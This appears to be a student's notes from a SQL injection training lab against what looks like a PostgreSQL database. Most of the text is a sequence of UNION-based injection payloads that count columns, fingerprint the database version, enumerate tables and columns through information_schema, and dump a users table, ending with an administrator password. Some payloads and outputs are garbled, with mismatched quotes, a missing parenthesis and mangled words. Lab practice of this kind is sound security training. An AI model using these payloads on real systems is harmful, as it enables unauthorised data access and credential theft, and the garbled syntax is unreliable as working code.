Lab 9 - SQL injection attack, listing the database contents on non-Oracle databases

End Goals:

•⁠  ⁠Determine the table that contains usernames and passwords
•⁠  ⁠Determine the relevant columns
•⁠  ⁠Output the content of the table
•⁠  ⁠Login as the administrator user

Analysis:

1.⁠ ⁠Find the number of columns
•⁠  ⁠order by 3--
	⁠Internal server error
3-1=2
& Find the data type of the columns
UNION select 'a", 'a'-
	⁠both columns accept type text
  
3.⁠ ⁠Version of the database

' UNION SELECT @@version, NULL--
-> not Microsoft
' UNION SELECT version), NULL--
-> 200 0K
PostgreSOL 11.11 (Debian 11.11-1.pgdg90+1)

4.⁠ ⁠Output the list of table names in the database

•⁠  ⁠UNION SELECT table_name, NULL FROM information_schema. tables--

users_fvdvvl

5. Output the column names of the table

   ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_fvdvvl'--

   username_uqbaol
   password_zmvbju

   6. Output the usernames and passwords
  
      ' UNION SELECT username_uqbaol, password_zmvbju from users_fvdvvl--

      administrator
      45pca8y1mi2k2hh46afg
